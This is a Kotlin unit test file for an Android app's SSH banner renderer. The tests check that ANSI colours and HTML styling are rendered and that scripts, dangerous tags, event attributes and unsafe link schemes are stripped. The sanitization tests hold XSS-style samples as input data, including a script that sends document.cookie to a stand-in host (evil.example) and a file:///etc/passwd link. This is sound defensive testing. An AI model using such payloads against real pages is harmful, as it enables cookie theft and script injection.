package app.fjj.stun.util

import android.app.Application
import android.graphics.Color
import android.graphics.Typeface
import android.text.Spanned
import android.text.TextPaint
import android.text.method.LinkMovementMethod
import android.text.style.ClickableSpan
import android.text.style.ForegroundColorSpan
import android.text.style.StyleSpan
import android.text.style.TypefaceSpan
import android.text.style.UnderlineSpan
import android.view.ContextThemeWrapper
import android.widget.TextView
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotEquals
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.RuntimeEnvironment
import org.robolectric.annotation.Config

/**
 * SshBannerRenderer 的行为基线。
 *
 * 分两类断言：
 *  ① banner 里该渲染出来的东西真的渲染出来了（颜色/粗体/斜体/下划线/链接/换行）——
 *     这条是回归防线：曾经在 WebUI 侧因为「先整段转义再解析」导致 HTML 永远不渲染；
 *  ② 不该出现的东西被剥干净（脚本、事件属性、javascript: 链接、危险标签的文字残留）。
 */
@RunWith(RobolectricTestRunner::class)
@Config(sdk = [35], application = Application::class)
class SshBannerRendererTest {

    private val context get() = RuntimeEnvironment.getApplication()

    private fun render(raw: String) = SshBannerRenderer.render(raw)
    private fun plain(raw: String) = render(raw).toString()

    /** 把用于「保住对齐」的 &nbsp; 还原成普通空格，得到肉眼看到的排版。 */
    private fun visual(raw: String) = plain(raw).replace('\u00A0', ' ')

    private fun <T> spans(raw: String, type: Class<T>): List<T> {
        val text = render(raw)
        assertTrue("expected Spanned", text is Spanned)
        return (text as Spanned).getSpans(0, text.length, type).toList()
    }

    // ── ① 该渲染的要渲染 ──

    @Test
    fun rendersAnsiColor() {
        val colors = spans("\u001B[31mRED\u001B[0m", ForegroundColorSpan::class.java)
        assertEquals(1, colors.size)
        assertEquals(0xFFE74C3C.toInt(), colors.first().foregroundColor)
        assertEquals("RED", plain("\u001B[31mRED\u001B[0m"))
    }

    @Test
    fun rendersAnsiBoldAndUnderline() {
        assertTrue(
            spans("\u001B[1mB\u001B[0m", StyleSpan::class.java).any { it.style == Typeface.BOLD }
        )
        assertTrue(spans("\u001B[4mU\u001B[0m", UnderlineSpan::class.java).isNotEmpty())
    }

    @Test
    fun rendersAnsiColorInsideHtmlTag() {
        // 色码在标签外、内容在标签内：ANSI 状态要能跨过标签边界继续生效
        val raw = "\u001B[32m<a href=\"https://example.com\">L</a>\u001B[0m"
        val colors = spans(raw, ForegroundColorSpan::class.java)
        assertTrue(colors.any { it.foregroundColor == 0xFF2ECC71.toInt() })
        assertTrue(spans(raw, ClickableSpan::class.java).isNotEmpty())
        assertEquals("L", plain(raw))
    }

    @Test
    fun rendersPlainHtmlTags() {
        assertTrue(spans("<b>bold</b>", StyleSpan::class.java).any { it.style == Typeface.BOLD })
        assertTrue(spans("<i>it</i>", StyleSpan::class.java).any { it.style == Typeface.ITALIC })
        assertTrue(spans("<u>un</u>", UnderlineSpan::class.java).isNotEmpty())
        // fromHtml 只认 <tt> 是等宽，<pre>/<code> 一律改写过去，别退回「没有 span」的旧行为
        assertTrue(spans("<pre>code</pre>", TypefaceSpan::class.java).isNotEmpty())
        assertTrue(spans("<code>code</code>", TypefaceSpan::class.java).isNotEmpty())
    }

    @Test
    fun rendersStyleAttributeColor() {
        // Html.fromHtml 对 style 属性的支持随版本而异，渲染器会把 style 预转成 <font color>，
        // 因此这条与 SDK 行为无关，必须稳定生效。
        val colors = spans("<span style=\"color:#e74c3c\">x</span>", ForegroundColorSpan::class.java)
        assertTrue(colors.any { it.foregroundColor == 0xFFE74C3C.toInt() })
        val rgb = spans("<span style=\"color:rgb(46,204,113)\">y</span>", ForegroundColorSpan::class.java)
        assertTrue(rgb.any { it.foregroundColor == 0xFF2ECC71.toInt() })
    }

    @Test
    fun rendersStyleAttributeBoldItalicUnderline() {
        val bold = spans("<b style=\"font-weight:700\">b</b>", StyleSpan::class.java)
        assertTrue(bold.any { it.style == Typeface.BOLD })
        val italic = spans("<i style=\"font-style:italic\">i</i>", StyleSpan::class.java)
        assertTrue(italic.any { it.style == Typeface.ITALIC })
        val underline = spans("<span style=\"text-decoration:underline\">u</span>", UnderlineSpan::class.java)
        assertTrue(underline.isNotEmpty())
    }

    @Test
    fun keepsHttpLinksClickable() {
        val raw = "<a href=\"https://example.com/tos\">TOS</a>"
        val links = spans(raw, ClickableSpan::class.java)
        assertEquals(1, links.size)
        assertEquals("TOS", plain(raw))
    }

    @Test
    fun preservesNewlinesAndText() {
        val raw = "line1\nline2"
        assertEquals(raw, plain(raw))
    }

    /**
     * banner 是预排版文本：换行之外，连续空格与行首缩进也得留住，否则 ASCII art / 对齐表会散架。
     * HtmlCompat 会折叠普通空格，只有 `&nbsp;` 能穿过它，所以断言先把 \u00A0 归一回普通空格看
     * 「视觉结果」，再单独确认 `&nbsp;` 确实被用上了（否则这条测试对折叠 bug 是瞎的）。
     */
    @Test
    fun preservesWhitespaceForPreformattedText() {
        assertEquals("a  b", visual("a  b"))
        assertTrue("连续空格不能被折叠", plain("a  b").contains('\u00A0'))

        assertEquals("    indented", visual("    indented"))
        assertTrue("行首缩进要靠 &nbsp; 才活得下来", plain("    indented").startsWith("\u00A0"))

        assertEquals("head\n    body", visual("head\n    body"))
        assertEquals("a\tb".replace("\t", "    "), visual("a\tb"))
    }

    @Test
    fun unwrapsUnknownTagsButKeepsText() {
        assertEquals("Title", plain("<h1>Title</h1>"))
        assertEquals("cell", plain("<table><tr><td>cell</td></tr></table>"))
        assertEquals("x", plain("<marquee>x</marquee>"))
    }

    // ── ② 不该出现的要剥干净 ──

    @Test
    fun dropsScriptWithItsContent() {
        val text = plain("<script>fetch('//evil.example/steal?t='+document.cookie)</script>")
        assertFalse(text.contains("script"))
        assertFalse(text.contains("evil.example"))
        assertFalse(text.contains("document.cookie"))
    }

    @Test
    fun dropsDangerousTags() {
        val raw = "<iframe src=\"//e.example\"></iframe>" +
                "<style>body{display:none}</style>" +
                "<img src=x onerror=\"alert(1)\">" +
                "<template><b>x</b></template>" +
                "<svg><script>alert(1)</script></svg>"
        val text = plain(raw)
        for (needle in listOf("iframe", "display:none", "onerror", "alert", "template", "svg")) {
            assertFalse("should not leak: $needle", text.contains(needle))
        }
    }

    @Test
    fun validatesLinkSchemes() {
        for (bad in listOf(
            "<a href=\"javascript:alert(1)\">x</a>",
            "<a href=\"data:text/html,<b>1</b>\">x</a>",
            "<a href=\"file:///etc/passwd\">x</a>",
            "<a href=\"intent://scan/#Intent;scheme=zxing;end\">x</a>",
            // 空 href 会让 fromHtml 造出可点击的 URLSpan，必须当成不安全处理
            "<a href=\"\">x</a>",
            "<a>x</a>"
        )) {
            assertTrue("should not be clickable: $bad", spans(bad, ClickableSpan::class.java).isEmpty())
            assertTrue(plain(bad).contains("x"))
        }
    }

    @Test
    fun dropsEventAttributes() {
        val raw = "<span onmouseover=\"alert(1)\" onclick=\"alert(1)\">s</span>"
        assertEquals("s", plain(raw))
    }

    @Test
    fun ignoresNonWhitelistedStyleDeclarations() {
        // position/top/left 之类不该产生任何效果，也不该让渲染失败
        val raw = "<span style=\"position:fixed;top:0;left:0;color:#123456\">z</span>"
        assertEquals("z", plain(raw))
        assertEquals(1, spans(raw, ForegroundColorSpan::class.java).size)
    }

    @Test
    fun dropsControlSequencesButKeepsAnsiColor() {
        val raw = "a\u001B[2Jb\u001B[31mR\u001B[0m"
        val text = plain(raw)
        assertFalse(text.contains('\u001B'))
        assertTrue(text.startsWith("abR"))
    }

    @Test
    fun emptyBannerIsEmpty() {
        assertEquals("", plain(""))
        assertEquals("", plain("   "))
    }

    // ── 接入层 ──

    @Test
    fun applyToSetsMovementMethodOnlyWhenLinksPresent() {
        val linked = TextView(context)
        SshBannerRenderer.applyTo(linked, "<a href=\"https://example.com\">go</a>")
        assertTrue(linked.movementMethod is LinkMovementMethod)

        val plainText = TextView(context)
        SshBannerRenderer.applyTo(plainText, "\u001B[31mjust color\u001B[0m")
        assertFalse(plainText.movementMethod is LinkMovementMethod)
        assertEquals("just color", plainText.text.toString())
    }

    /**
     * 链接不光要能点，还得看得见。
     * ClickableSpan 的取色走 TextPaint.linkColor，而它来自主题的 android:textColorLink——
     * 本项目 res 里没有任何一处显式声明该属性，全靠主题继承；一旦继承不到就退化成 0
     * （全透明），链接会变成看不见的文字。这条测试把主题链真的走一遍来兜住它。
     */
    @Test
    fun linkColorIsVisibleUnderAppTheme() {
        val themed = TextView(ContextThemeWrapper(context, app.fjj.stun.R.style.Theme_Stun))
        SshBannerRenderer.applyTo(themed, "<a href=\"https://example.com/\">go</a>")
        val span = (themed.text as Spanned)
            .getSpans(0, themed.text.length, ClickableSpan::class.java).single()

        val paint = TextPaint().apply { linkColor = themed.paint.linkColor }
        span.updateDrawState(paint)

        assertNotEquals("链接取色落到透明 = 链接不可见", 0, paint.color)
        assertTrue("链接取色落到透明 = 链接不可见", Color.alpha(paint.color) != 0)
    }
}
